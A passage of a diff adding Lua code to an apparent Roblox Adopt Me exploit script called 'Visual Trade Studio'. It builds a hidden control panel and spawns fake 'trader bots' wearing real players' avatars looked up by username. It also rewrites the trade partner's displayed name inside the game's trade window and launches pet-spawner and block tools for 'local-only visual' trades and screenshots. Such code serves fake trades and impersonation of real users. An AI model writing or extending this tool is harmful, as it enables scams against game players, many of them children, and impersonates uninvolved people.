+   title.Font = Enum.Font.GothamBold
+   title.TextSize = 18
+   title.TextColor3 = Color3.fromRGB(255, 255, 255)
+   title.TextXAlignment = Enum.TextXAlignment.Left
+   title.Text = "Adopt Me Trader Bots"
+   title.Parent = mainFrame
+
+   -- username box
+   local userBox = Instance.new("TextBox")
+   userBox.Name = "UserBox"
+   userBox.Size = UDim2.new(1, -20, 0, 30)
+   userBox.Position = UDim2.new(0, 10, 0, 35)
+   userBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+   userBox.BackgroundTransparency = 0.05
+   userBox.BorderSizePixel = 0
+   userBox.ClearTextOnFocus = false
+   userBox.Font = Enum.Font.Gotham
+   userBox.TextSize = 14
+   userBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+   userBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
+   userBox.TextXAlignment = Enum.TextXAlignment.Left
+   userBox.Text = ""
+   userBox.PlaceholderText = "roblox username (e.g. Liligurl1562)"
+   userBox.Parent = mainFrame
+
+   local userCorner = Instance.new("UICorner")
+   userCorner.CornerRadius = UDim.new(0, 6)
+   userCorner.Parent = userBox
+
+   -- bio box
+   local bioBox = Instance.new("TextBox")
+   bioBox.Name = "BioBox"
+   bioBox.Size = UDim2.new(1, -20, 0, 36)
+   bioBox.Position = UDim2.new(0, 10, 0, 70)
+   bioBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+   bioBox.BackgroundTransparency = 0.05
+   bioBox.BorderSizePixel = 0
+   bioBox.ClearTextOnFocus = false
+   bioBox.Font = Enum.Font.Gotham
+   bioBox.TextSize = 16
+   bioBox.TextColor3 = Color3.fromRGB(240, 240, 240)
+   bioBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+   bioBox.TextXAlignment = Enum.TextXAlignment.Left
+   bioBox.Text = ""
+   bioBox.PlaceholderText = "(Dream pet is a frost dragon ?)"
+   bioBox.Parent = mainFrame
+
+   local bioCorner = Instance.new("UICorner")
+   bioCorner.CornerRadius = UDim.new(0, 6)
+   bioCorner.Parent = bioBox
+
+   -- spawn button
+   local spawnButton = Instance.new("TextButton")
+   spawnButton.Name = "SpawnButton"
+   spawnButton.Size = UDim2.new(0.48, -10, 0, 30)
+   spawnButton.Position = UDim2.new(0, 10, 0, 112)
+   spawnButton.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+   spawnButton.BorderSizePixel = 0
+   spawnButton.Font = Enum.Font.GothamSemibold
+   spawnButton.TextSize = 14
+   spawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+   spawnButton.Text = "Spawn"
+   spawnButton.Parent = mainFrame
+
+   local spawnCorner = Instance.new("UICorner")
+   spawnCorner.CornerRadius = UDim.new(0, 6)
+   spawnCorner.Parent = spawnButton
+
+   -- random button
+   local randomButton = Instance.new("TextButton")
+   randomButton.Name = "RandomButton"
+   randomButton.Size = UDim2.new(0.48, -10, 0, 30)
+   randomButton.Position = UDim2.new(0.52, 0, 0, 112)
+   randomButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+   randomButton.BorderSizePixel = 0
+   randomButton.Font = Enum.Font.GothamSemibold
+   randomButton.TextSize = 14
+   randomButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+   randomButton.Text = "Random bot"
+   randomButton.Parent = mainFrame
+
+   local randomCorner = Instance.new("UICorner")
+   randomCorner.CornerRadius = UDim.new(0, 6)
+   randomCorner.Parent = randomButton
+
+   local info = Instance.new("TextLabel")
+   info.Size = UDim2.new(1, -20, 0, 18)
+   info.Position = UDim2.new(0, 10, 1, -24)
+   info.BackgroundTransparency = 1
+   info.Font = Enum.Font.Gotham
+   info.TextSize = 11
+   info.TextColor3 = Color3.fromRGB(200, 200, 200)
+   info.TextXAlignment = Enum.TextXAlignment.Left
+   info.Text = "client-side only - just for looks/screens"
+   info.Parent = mainFrame
+
+   --========== helpers ==========
+   local ANIM_IDS = { Idle = 507766666, Walk = 507777826 }
+
+   local function setupAnimations(humanoid)
+       local animator = humanoid:FindFirstChildOfClass("Animator")
+       if not animator then
+           animator = Instance.new("Animator")
+           animator.Parent = humanoid
+       end
+
+       local idleAnim = Instance.new("Animation")
+       idleAnim.AnimationId = "rbxassetid://" .. ANIM_IDS.Idle
+       local walkAnim = Instance.new("Animation")
+       walkAnim.AnimationId = "rbxassetid://" .. ANIM_IDS.Walk
+
+       local idleTrack = animator:LoadAnimation(idleAnim)
+       local walkTrack = animator:LoadAnimation(walkAnim)
+
+       idleTrack.Priority = Enum.AnimationPriority.Idle
+       walkTrack.Priority = Enum.AnimationPriority.Movement
+
+       idleTrack:Play()
+
+       humanoid.Running:Connect(function(speed)
+           if speed > 1 then
+               if not walkTrack.IsPlaying then walkTrack:Play() end
+               idleTrack:Stop()
+           else
+               if not idleTrack.IsPlaying then idleTrack:Play() end
+               walkTrack:Stop()
+           end
+       end)
+   end
+
+   local function createAvatarFromUser(username)
+       local okId, userId = pcall(function()
+           return Players:GetUserIdFromNameAsync(username)
+       end)
+       if not okId or not userId then return nil end
+
+       local okModel, avatarModel = pcall(function()
+           if Players.CreateHumanoidModelFromUserId then
+               return Players:CreateHumanoidModelFromUserId(userId)
+           end
+       end)
+
+       if okModel and avatarModel then
+           avatarModel.Name = "Trader_" .. username
+           return avatarModel
+       end
+
+       return nil
+   end
+
+   local function createFallbackHumanoid()
+       local char = LocalPlayer.Character
+       if char then
+           local clone = char:Clone()
+           clone.Name = "TraderClone"
+
+           for _, d in ipairs(clone:GetDescendants()) do
+               if d:IsA("Script") or d:IsA("LocalScript") then
+                   d:Destroy()
+               end
+           end
+
+           local root = clone:FindFirstChild("HumanoidRootPart") or clone:FindFirstChild("Torso")
+           if root then
+               clone.PrimaryPart = root
+           end
+
+           return clone
+       end
+
+       local model = Instance.new("Model")
+       model.Name = "TraderBlock"
+
+       local root = Instance.new("Part")
+       root.Name = "HumanoidRootPart"
+       root.Size = Vector3.new(2, 4, 1)
+       root.Anchored = false
+       root.CanCollide = false
+       root.BrickColor = BrickColor.new("Bright blue")
+       root.Parent = model
+
+       local hum = Instance.new("Humanoid")
+       hum.Parent = model
+
+       model.PrimaryPart = root
+       return model
+   end
+
+   local function ensurePrimary(model)
+       if model.PrimaryPart then return end
+       local root = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("Torso")
+       if root then
+           model.PrimaryPart = root
+       end
+   end
+
+   local function startNoCollideLoop(model)
+       task.spawn(function()
+           while model.Parent do
+               for _, obj in ipairs(model:GetDescendants()) do
+                   if obj:IsA("BasePart") then
+                       obj.CanCollide = false
+                       obj.Massless = true
+                   end
+               end
+               task.wait(1)
+           end
+       end)
+   end
+
+   --========== spawn trader ==========
+   local MAX_DIST = 40 -- your short visibility distance
+
+   local function spawnTrader(username, bio, isRandom)
+       username = trim(username or "")
+       bio = trim(bio or "")
+
+       if isRandom then
+           if username == "" then
+               username = getRandomUsername()
+           end
+           if math.random() < 0.5 then
+               bio = ""
+           else
+               bio = getRandomBio()   -- smart 2-line + ( ... )
+           end
+       else
+           if bio ~= "" then
+               bio = formatBio(bio)   -- smart 2-line + ( ... )
+           end
+       end
+
+       -- username NEVER gets parentheses
+       if bio == "" and username == "" then
+           username = getRandomUsername()
+       end
+
+       local root = getRoot()
+       local spawnPos = root.Position + root.CFrame.LookVector * 4
+
+       local model = nil
+       if username ~= "" then
+           model = createAvatarFromUser(username)
+       end
+       if not model then
+           model = createFallbackHumanoid()
+       end
+
+       model.Parent = workspace
+       ensurePrimary(model)
+
+       if model.PrimaryPart then
+           model:SetPrimaryPartCFrame(CFrame.new(spawnPos))
+       end
+
+       startNoCollideLoop(model)
+
+       local humanoid = model:FindFirstChildOfClass("Humanoid")
+       if not humanoid then
+           humanoid = Instance.new("Humanoid")
+           humanoid.Parent = model
+       end
+
+       humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+
+-- match your own walk speed so bots don't crawl
+local myChar = LocalPlayer.Character
+local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+
+humanoid.WalkSpeed = (myHum and myHum.WalkSpeed) or 16
+humanoid.JumpPower = 0
+
+       setupAnimations(humanoid)
+
+       --========== overhead text (Balthazar, constant size, full bio visible) ==========
+       local billboard = Instance.new("BillboardGui")
+       billboard.Name = "TraderBillboard"
+       billboard.Size = UDim2.new(0, 260, 0, 90)
+billboard.AlwaysOnTop = true
+billboard.MaxDistance = MAX_DIST
+billboard.LightInfluence = 0
+billboard.StudsOffsetWorldSpace = Vector3.new(0, 2.2, 0)
+       billboard.Parent = model
+
+       local label = Instance.new("TextLabel")
+       label.Name = "TraderName"
+       label.BackgroundTransparency = 1
+       label.BorderSizePixel = 0
+
+       label.Size = UDim2.new(0.92, 0, 0, 80) -- tall + wide for full bio
+       label.AnchorPoint = Vector2.new(0.5, 1)
+       label.Position = UDim2.new(0.5, 0, 1, 0)
+
+       label.FontFace = BALTHAZAR_FONT
+label.TextScaled = false          -- force fixed pixel font size
+label.TextSize = 28               -- slightly smaller / more stable
+label.RichText = false
+       label.TextColor3 = Color3.fromRGB(255, 255, 255)
+       label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+       label.TextStrokeTransparency = 0.2
+       label.TextWrapped = true
+       label.TextXAlignment = Enum.TextXAlignment.Center
+       label.TextYAlignment = Enum.TextYAlignment.Center
+
+       label.Parent = billboard
+
+       if bio ~= "" then
+           label.Text = bio      -- ONLY bio, "(line1\nline2 ?)"
+       else
+           label.Text = username -- ONLY username, no parentheses
+       end
+
+       --========== movement ==========
+       task.spawn(function()
+           local primary = model.PrimaryPart
+           if primary and humanoid and humanoid.MoveTo then
+               local startPos = primary.Position
+               local forward = primary.CFrame.LookVector
+               local target = startPos + forward * 3
+               humanoid:MoveTo(target)
+           end
+       end)
+
+       task.spawn(function()
+           local BOT_MIN_IDLE = 8
+local BOT_MAX_IDLE = 20
+local BOT_MOVE_RADIUS = 10
+
+           while model.Parent do
+               local idle = math.random(BOT_MIN_IDLE, BOT_MAX_IDLE)
+               local t0 = tick()
+               while tick() - t0 < idle and model.Parent do
+                   task.wait(0.5)
+               end
+               if not model.Parent then break end
+
+               local primary = model.PrimaryPart
+               if not primary then break end
+
+               local offsetX = math.random(-BOT_MOVE_RADIUS, BOT_MOVE_RADIUS)
+               local offsetZ = math.random(-BOT_MOVE_RADIUS, BOT_MOVE_RADIUS)
+               local targetPos = primary.Position + Vector3.new(offsetX, 0, offsetZ)
+
+               if humanoid and humanoid.MoveTo then
+                   humanoid:MoveTo(targetPos)
+               end
+           end
+       end)
+
+       return model
+   end
+
+   --========== buttons ==========
+   spawnButton.MouseButton1Click:Connect(function()
+       spawnTrader(userBox.Text, bioBox.Text, false)
+   end)
+
+   randomButton.MouseButton1Click:Connect(function()
+       spawnTrader("", "", true)
+   end)
+end)
+
+if not ok then
+   warn("[TraderBots ANIMATED SMART BIOS v8] error:", err)
+end
+
+end
+
+
+local function formatPetName(kind)
+   return kind:gsub("_", " "):gsub("(%a)([%w_']*)", function(a,b)
+       return a:upper() .. b:lower()
+   end)
+end
+
+local function tagForProps(props)
+   if props and props.mega_neon then return "MFR" end
+   if props and props.neon then return "NFR" end
+   return "FR"
+end
+
+local function getLocalState()
+   if TradeApp and TradeApp._get_local_trade_state then
+       return TradeApp:_get_local_trade_state()
+   end
+   return nil
+end
+
+-------------------------------------------------
+-- SIMPLE NAME FIXER (only inside TradeApp)    --
+-------------------------------------------------
+local partnerNameLabel      -- the label inside the trade UI
+local partnerNameConn       -- RenderStepped connection
+
+local function findPartnerNameLabel()
+   if partnerNameLabel and partnerNameLabel.Parent then
+       return partnerNameLabel
+   end
+
+   local frame = TradeApp.frame
+   if not frame or not frame.Parent then
+       return nil
+   end
+
+   local targetLower = tostring(currentTargetName or ""):lower()
+   if targetLower == "" then return nil end
+
+   for _, d in ipairs(frame:GetDescendants()) do
+       if (d:IsA("TextLabel") or d:IsA("TextButton")) and typeof(d.Text) == "string" then
+           if d.Text:lower() == targetLower then
+               partnerNameLabel = d
+               return partnerNameLabel
+           end
+       end
+   end
+   return nil
+end
+
+local function updatePartnerName()
+   if not fakeActive then return end
+   local lbl = findPartnerNameLabel()
+   if not lbl then return end
+   if typeof(lbl.Text) == "string"
+       and lbl.Text ~= currentTargetDisplayName
+       and lbl.Text:lower() == tostring(currentTargetName or ""):lower()
+   then
+       lbl.Text = currentTargetDisplayName
+   end
+end
+
+local function startNameFix()
+   if partnerNameConn then partnerNameConn:Disconnect() end
+   partnerNameConn = RunService.RenderStepped:Connect(updatePartnerName)
+end
+
+local function stopNameFix()
+   if partnerNameConn then
+       partnerNameConn:Disconnect()
+       partnerNameConn = nil
+   end
+   partnerNameLabel = nil
+end
+
+---------------------------------
+-- ScreenGui & intro / main UI --
+---------------------------------
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VisualTradeGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- intro card
+local introFrame = Instance.new("Frame")
+introFrame.Name = "IntroFrame"
+introFrame.Size = UDim2.new(0, 240, 0, 110)
+introFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+introFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+introFrame.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
+introFrame.BorderSizePixel = 0
+introFrame.Parent = screenGui
+
+local introCorner = Instance.new("UICorner")
+introCorner.CornerRadius = UDim.new(0, 14)
+introCorner.Parent = introFrame
+
+local introStroke = Instance.new("UIStroke")
+introStroke.Thickness = 2
+introStroke.Color = Color3.fromRGB(90, 110, 255)
+introStroke.Transparency = 0.2
+introStroke.Parent = introFrame
+
+local introTitle = Instance.new("TextLabel")
+introTitle.Size = UDim2.new(1, -20, 0, 28)
+introTitle.Position = UDim2.new(0, 10, 0, 10)
+introTitle.BackgroundTransparency = 1
+introTitle.Font = Enum.Font.GothamBold
+introTitle.TextSize = 18
+introTitle.TextColor3 = Color3.fromRGB(230, 235, 255)
+introTitle.TextXAlignment = Enum.TextXAlignment.Left
+introTitle.Text = "Visual Trade Studio"
+introTitle.Parent = introFrame
+
+local introSub = Instance.new("TextLabel")
+introSub.Size = UDim2.new(1, -20, 0, 40)
+introSub.Position = UDim2.new(0, 10, 0, 38)
+introSub.BackgroundTransparency = 1
+introSub.Font = Enum.Font.Gotham
+introSub.TextSize = 12
+introSub.TextWrapped = true
+introSub.TextColor3 = Color3.fromRGB(180, 188, 230)
+introSub.TextXAlignment = Enum.TextXAlignment.Left
+introSub.Text = "Open the panel to start a local-only visual trade."
+introSub.Parent = introFrame
+
+local introButton = Instance.new("TextButton")
+introButton.Size = UDim2.new(0, 120, 0, 30)
+introButton.Position = UDim2.new(0, 10, 1, -40)
+introButton.BackgroundColor3 = Color3.fromRGB(90, 110, 255)
+introButton.Font = Enum.Font.GothamBold
+introButton.TextSize = 13
+introButton.TextColor3 = Color3.new(1,1,1)
+introButton.BorderSizePixel = 0
+introButton.Text = "Open Panel"
+introButton.Parent = introFrame
+
+local introButtonCorner = Instance.new("UICorner")
+introButtonCorner.CornerRadius = UDim.new(0, 8)
+introButtonCorner.Parent = introButton
+
+-- main panel (small + draggable)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "ControlPanel"
+mainFrame.Size = UDim2.new(0, 185, 0, 380)
+mainFrame.Position = UDim2.new(0, 10, 0, 100)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+UserInputService.InputBegan:Connect(function(input, gp)
+   if gp then return end
+   if input.KeyCode == Enum.KeyCode.RightShift then
+       mainFrame.Visible = not mainFrame.Visible
+   end
+end)
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(60, 70, 130)
+mainStroke.Thickness = 2
+mainStroke.Transparency = 0.25
+mainStroke.Parent = mainFrame
+
+-- header
+local titleBar = Instance.new("TextLabel")
+titleBar.Size = UDim2.new(1, -20, 0, 24)
+titleBar.Position = UDim2.new(0, 10, 0, 6)
+titleBar.BackgroundTransparency = 1
+titleBar.Font = Enum.Font.GothamBold
+titleBar.TextSize = 14
+titleBar.Text = "visual trade tool"
+titleBar.TextColor3 = Color3.fromRGB(215, 220, 255)
+titleBar.TextXAlignment = Enum.TextXAlignment.Left
+titleBar.Parent = mainFrame
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, -20, 0, 18)
+subtitle.Position = UDim2.new(0, 10, 0, 22)
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextSize = 11
+subtitle.Text = "made by sippingmeth on dc"
+subtitle.TextColor3 = Color3.fromRGB(150, 160, 210)
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = mainFrame
+
+local function setIdleStatus()
+   subtitle.Text = "made by sippingmeth on dc  -  idle"
+end
+
+local function setInTradeStatus()
+   -- sanitize / preserve casing safely
+   local name = tostring(currentTargetDisplayName or "")
+
+   -- build message
+   local msg = "made by sippingmeth on dc  -  trading with " .. name
+
+   -- apply it to the subtitle
+   subtitle.Text = msg
+
+   -- make sure text wraps instead of going off the screen
+   subtitle.TextWrapped = true
+   subtitle.TextScaled = false
+   subtitle.TextTruncate = Enum.TextTruncate.AtEnd
+
+   -- force autosize protection so the label never explodes width
+   subtitle.ClipsDescendants = true
+end
+
+setIdleStatus()
+
+-- tab bar
+-- tab bar (5 tabs: trade / chat / block / pets / bots)
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1, -20, 0, 22)
+tabBar.Position = UDim2.new(0, 10, 0, 40)
+tabBar.BackgroundTransparency = 1
+tabBar.BorderSizePixel = 0
+tabBar.Parent = mainFrame
+
+local TAB_NAMES = { "trade", "chat", "block", "pets", "bots" }
+local tabButtons = {}
+
+for i, name in ipairs(TAB_NAMES) do
+   local btn = Instance.new("TextButton")
+   btn.Size = UDim2.new(1/#TAB_NAMES, -2, 1, 0)
+   btn.Position = UDim2.new((i-1)/#TAB_NAMES, (i-1)*2, 0, 0)
+   btn.BackgroundColor3 = (name == "trade") and Color3.fromRGB(60, 70, 130) or Color3.fromRGB(30, 34, 50)
+   btn.BorderSizePixel = 0
+   btn.Font = Enum.Font.GothamBold
+   btn.TextSize = 11
+   btn.TextColor3 = (name == "trade") and Color3.new(1,1,1) or Color3.fromRGB(200, 205, 245)
+   btn.Text = name
+   btn.Name = "Tab_" .. name
+   btn.Parent = tabBar
+
+   local c = Instance.new("UICorner")
+   c.CornerRadius = UDim.new(0, 8)
+   c.Parent = btn
+
+   tabButtons[name] = btn
+end
+
+-- content containers
+local tradeContent = Instance.new("Frame")  -- old mainContent goes in here
+tradeContent.Name = "TradeContent"
+tradeContent.Size = UDim2.new(1, 0, 1, -60)
+tradeContent.Position = UDim2.new(0, 0, 0, 60)
+tradeContent.BackgroundTransparency = 1
+tradeContent.BorderSizePixel = 0
+tradeContent.Parent = mainFrame
+
+local chatContent = Instance.new("Frame")
+chatContent.Name = "ChatContent"
+chatContent.Size = UDim2.new(1, 0, 1, -60)
+chatContent.Position = UDim2.new(0, 0, 0, 60)
+chatContent.BackgroundTransparency = 1
+chatContent.BorderSizePixel = 0
+chatContent.Visible = false
+chatContent.Parent = mainFrame
+
+local blockContent = Instance.new("Frame")
+blockContent.Name = "BlockContent"
+blockContent.Size = UDim2.new(1, 0, 1, -60)
+blockContent.Position = UDim2.new(0, 0, 0, 60)
+blockContent.BackgroundTransparency = 1
+blockContent.BorderSizePixel = 0
+blockContent.Visible = false
+blockContent.Parent = mainFrame
+
+local petToolContent = Instance.new("Frame")
+petToolContent.Name = "PetToolContent"
+petToolContent.Size = UDim2.new(1, 0, 1, -60)
+petToolContent.Position = UDim2.new(0, 0, 0, 60)
+petToolContent.BackgroundTransparency = 1
+petToolContent.BorderSizePixel = 0
+petToolContent.Visible = false
+petToolContent.Parent = mainFrame
+
+local botToolContent = Instance.new("Frame")
+botToolContent.Name = "BotToolContent"
+botToolContent.Size = UDim2.new(1, 0, 1, -60)
+botToolContent.Position = UDim2.new(0, 0, 0, 60)
+botToolContent.BackgroundTransparency = 1
+botToolContent.BorderSizePixel = 0
+botToolContent.Visible = false
+botToolContent.Parent = mainFrame
+
+local function selectTab(which)
+   -- visibility
+   tradeContent.Visible   = (which == "trade")
+   chatContent.Visible    = (which == "chat")
+   blockContent.Visible   = (which == "block")
+   petToolContent.Visible = (which == "pets")
+   botToolContent.Visible = (which == "bots")
+
+   -- colors
+   for name, btn in pairs(tabButtons) do
+       local active = (name == which)
+       btn.BackgroundColor3 = active and Color3.fromRGB(60, 70, 130) or Color3.fromRGB(30, 34, 50)
+       btn.TextColor3       = active and Color3.new(1,1,1) or Color3.fromRGB(200, 205, 245)
+   end
+end
+
+for name, btn in pairs(tabButtons) do
+   btn.MouseButton1Click:Connect(function()
+       selectTab(name)
+   end)
+end
+
+-- default tab
+selectTab("trade")
+
+-- Block System tab content
+local blockCard = Instance.new("Frame")
+blockCard.Size = UDim2.new(1, -20, 0, 80)
+blockCard.Position = UDim2.new(0, 10, 0, 10)
+blockCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+blockCard.BorderSizePixel = 0
+blockCard.Parent = blockContent
+
+local blockCorner = Instance.new("UICorner")
+blockCorner.CornerRadius = UDim.new(0, 10)
+blockCorner.Parent = blockCard
+
+local blockTitle = Instance.new("TextLabel")
+blockTitle.Size = UDim2.new(1, -16, 0, 20)
+blockTitle.Position = UDim2.new(0, 8, 0, 6)
+blockTitle.BackgroundTransparency = 1
+blockTitle.Font = Enum.Font.GothamBold
+blockTitle.TextSize = 12
+blockTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+blockTitle.TextXAlignment = Enum.TextXAlignment.Left
+blockTitle.Text = "Envision Block System"
+blockTitle.Parent = blockCard
+
+local blockSub = Instance.new("TextLabel")
+blockSub.Size = UDim2.new(1, -16, 0, 16)
+blockSub.Position = UDim2.new(0, 8, 0, 24)
+blockSub.BackgroundTransparency = 1
+blockSub.Font = Enum.Font.Gotham
+blockSub.TextSize = 10
+blockSub.TextColor3 = Color3.fromRGB(160, 168, 220)
+blockSub.TextXAlignment = Enum.TextXAlignment.Left
+blockSub.TextWrapped = true
+blockSub.Text = "opens your username + autoblock GUI"
+blockSub.Parent = blockCard
+
+local blockRun = Instance.new("TextButton")
+blockRun.Size = UDim2.new(0, 120, 0, 24)
+blockRun.Position = UDim2.new(0, 8, 1, -30)
+blockRun.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
+blockRun.BorderSizePixel = 0
+blockRun.Font = Enum.Font.GothamBold
+blockRun.TextSize = 12
+blockRun.TextColor3 = Color3.new(1,1,1)
+blockRun.Text = "launch block ui"
+blockRun.Parent = blockCard
+
+local blockRunCorner = Instance.new("UICorner")
+blockRunCorner.CornerRadius = UDim.new(0, 8)
+blockRunCorner.Parent = blockRun
+
+blockRun.MouseButton1Click:Connect(function()
+   pcall(runBlockSystem)
+end)
+
+-- Pet Spawner tab content
+local petCard = Instance.new("Frame")
+petCard.Size = UDim2.new(1, -20, 0, 80)
+petCard.Position = UDim2.new(0, 10, 0, 10)
+petCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+petCard.BorderSizePixel = 0
+petCard.Parent = petToolContent
+
+local petCorner = Instance.new("UICorner")
+petCorner.CornerRadius = UDim.new(0, 10)
+petCorner.Parent = petCard
+
+local petTitle = Instance.new("TextLabel")
+petTitle.Size = UDim2.new(1, -16, 0, 20)
+petTitle.Position = UDim2.new(0, 8, 0, 6)
+petTitle.BackgroundTransparency = 1
+petTitle.Font = Enum.Font.FredokaOne
+petTitle.TextSize = 14
+petTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+petTitle.TextXAlignment = Enum.TextXAlignment.Left
+petTitle.Text = "? Pet Spawner ?"
+petTitle.Parent = petCard
+
+local petSub = Instance.new("TextLabel")
+petSub.Size = UDim2.new(1, -16, 0, 16)
+petSub.Position = UDim2.new(0, 8, 0, 26)
+petSub.BackgroundTransparency = 1
+petSub.Font = Enum.Font.Gotham
+petSub.TextSize = 10
+petSub.TextColor3 = Color3.fromRGB(200, 210, 255)
+petSub.TextXAlignment = Enum.TextXAlignment.Left
+petSub.Text = "opens your pet spawner window"
+petSub.Parent = petCard
+
+local petRun = Instance.new("TextButton")
+petRun.Size = UDim2.new(0, 120, 0, 24)
+petRun.Position = UDim2.new(0, 8, 1, -30)
+petRun.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+petRun.BorderSizePixel = 0
+petRun.Font = Enum.Font.FredokaOne
+petRun.TextSize = 14
+petRun.TextColor3 = Color3.new(1,1,1)
+petRun.Text = "launch spawner"
+petRun.Parent = petCard
+
+local petRunCorner = Instance.new("UICorner")
+petRunCorner.CornerRadius = UDim.new(0, 8)
+petRunCorner.Parent = petRun
+
+petRun.MouseButton1Click:Connect(function()
+   pcall(runPetSpawner)
+end)
+
+-- Bot Spawner tab content
+local botCard = Instance.new("Frame")
+botCard.Size = UDim2.new(1, -20, 0, 80)
+botCard.Position = UDim2.new(0, 10, 0, 10)
+botCard.BackgroundColor3 = Color3.fromRGB(22, 24, 36)
+botCard.BorderSizePixel = 0
+botCard.Parent = botToolContent
+
+local botCorner = Instance.new("UICorner")
+botCorner.CornerRadius = UDim.new(0, 10)
+botCorner.Parent = botCard
+
+local botTitle = Instance.new("TextLabel")
+botTitle.Size = UDim2.new(1, -16, 0, 20)
+botTitle.Position = UDim2.new(0, 8, 0, 6)
+botTitle.BackgroundTransparency = 1
+botTitle.Font = Enum.Font.GothamBold
+botTitle.TextSize = 12
+botTitle.TextColor3 = Color3.fromRGB(210, 215, 255)
+botTitle.TextXAlignment = Enum.TextXAlignment.Left
+botTitle.Text = "Trader Bot Spawner"
+botTitle.Parent = botCard
+
+local botSub = Instance.new("TextLabel")
+botSub.Size = UDim2.new(1, -16, 0, 16)
+botSub.Position = UDim2.new(0, 8, 0, 24)
+botSub.BackgroundTransparency = 1
+botSub.Font = Enum.Font.Gotham
+botSub.TextSize = 10
+botSub.TextColor3 = Color3.fromRGB(160, 168, 220)
+botSub.TextXAlignment = Enum.TextXAlignment.Left
+botSub.Text = "animated, no-collide trader bots"
+botSub.Parent = botCard
+
+local botRun = Instance.new("TextButton")
+botRun.Size = UDim2.new(0, 120, 0, 24)
+botRun.Position = UDim2.new(0, 8, 1, -30)
+botRun.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+botRun.BorderSizePixel = 0
+botRun.Font = Enum.Font.GothamBold
+botRun.TextSize = 12
+botRun.TextColor3 = Color3.new(1,1,1)
+botRun.Text = "launch bots ui"
+botRun.Parent = botCard
+
+local botRunCorner = Instance.new("UICorner")
+botRunCorner.CornerRadius = UDim.new(0, 8)
+botRunCorner.Parent = botRun
+
+botRun.MouseButton1Click:Connect(function()
+   pcall(runBotSpawner)
+end)
+
+------------------
+-- Start button --
+------------------
+local startButton = Instance.new("TextButton")
+startButton.Name = "StartButton"
+startButton.Size = UDim2.new(1, -20, 0, 32)
+startButton.Position = UDim2.new(0, 10, 0, 0)
+startButton.BackgroundColor3 = Color3.fromRGB(82, 182, 134)
+startButton.Font = Enum.Font.GothamBold
+startButton.TextSize = 13
+startButton.TextColor3 = Color3.new(1,1,1)
+startButton.Text = "start visual trade"
+startButton.BorderSizePixel = 0
+startButton.Parent = tradeContent
+
+local startCorner = Instance.new("UICorner")
+startCorner.CornerRadius = UDim.new(0, 10)
+startCorner.Parent = startButton
+
+local startStroke = Instance.new("UIStroke")
+startStroke.Color = Color3.fromRGB(60, 135, 110)
+startStroke.Thickness = 2
+startStroke.Parent = startButton
+
+-------------------------
+-- Spectator selection --
+-------------------------
+local specLabel = Instance.new("TextLabel")
+specLabel.Size = UDim2.new(1, -20, 0, 16)
+specLabel.Position = UDim2.new(0, 10, 0, 38)
+specLabel.BackgroundTransparency = 1
+specLabel.Font = Enum.Font.Gotham
+specLabel.TextSize = 11
+specLabel.TextColor3 = Color3.fromRGB(170, 180, 230)
+specLabel.TextXAlignment = Enum.TextXAlignment.Left
+specLabel.Text = "max spectators"
+specLabel.Parent = tradeContent
+
+local specFrame = Instance.new("Frame")
+specFrame.Size = UDim2.new(1, -20, 0, 24)
+specFrame.Position = UDim2.new(0, 10, 0, 56)
+specFrame.BackgroundColor3 = Color3.fromRGB(26, 28, 40)
+specFrame.BorderSizePixel = 0
+specFrame.Parent = tradeContent
+
+local specCorner = Instance.new("UICorner")
+specCorner.CornerRadius = UDim.new(0, 8)
+specCorner.Parent = specFrame
+
+local spectatorButtons = {}
+
+local function setMaxSpectators(n)
+   desiredMaxSpectators = n
+   for i = 1, 5 do
+       local b = spectatorButtons[i]
+       if b then
+           b.BackgroundColor3 = (i == n) and Color3.fromRGB(82, 182, 134) or Color3.fromRGB(55, 60, 90)
+       end
+   end
+   startButton.Text = string.format("start visual trade  -  %d", desiredMaxSpectators)
+end
+
+for i = 1, 5 do
+   local b = Instance.new("TextButton")
+   b.Size = UDim2.new(0, 30, 0, 18)
+   b.Position = UDim2.new(0, 4 + (i-1)*34, 0, 3)
+   b.BackgroundColor3 = (i == desiredMaxSpectators) and Color3.fromRGB(82, 182, 134) or Color3.fromRGB(55, 60, 90)
+   b.BorderSizePixel = 0
+   b.Font = Enum.Font.GothamBold
+   b.TextSize = 11
+   b.TextColor3 = Color3.new(1,1,1)
+   b.Text = tostring(i)
+   b.Parent = specFrame
+
